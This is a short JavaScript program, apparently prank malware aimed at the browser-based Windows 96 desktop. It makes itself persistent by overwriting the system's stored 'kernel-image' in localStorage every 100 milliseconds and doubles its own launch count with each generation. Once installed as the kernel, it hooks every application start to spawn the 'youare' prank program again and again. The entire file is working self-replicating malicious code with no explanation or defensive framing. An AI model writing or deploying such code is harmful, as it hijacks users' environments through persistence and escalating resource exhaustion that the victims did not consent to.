(function self(kernelMode, times) {
    // kernelMode = running as custom kernel
    // times = how many times to launch youare per trigger event
    function selfie() {
        return `(${self.toString()})(true, ${times*2});`
    }
    
    function kernel() {
        window.w96 = window._kold;
        let realMain = w96.main;
        w96.main = async function() {
            await realMain();
            let realAppMain = w96.WApplication.prototype.main;
            w96.WApplication.prototype.main = async function idiotMain(...args) {
                w96.WApplication.prototype.main = realAppMain;
                for(let i = 0; i < times; i++) {
                    w96.sys.execCmd("youare");
                }
                let result = realAppMain.apply(this, args);
                w96.WApplication.prototype.main = idiotMain;
                return result;
            };
        };
    }

    function tsr() {
        setInterval(install, 100);
    }

    function install() {
        localStorage.setItem("kernel-image", selfie());
    }

    tsr();

    if(kernelMode) {
        kernel();
    }

    
})(false, 1);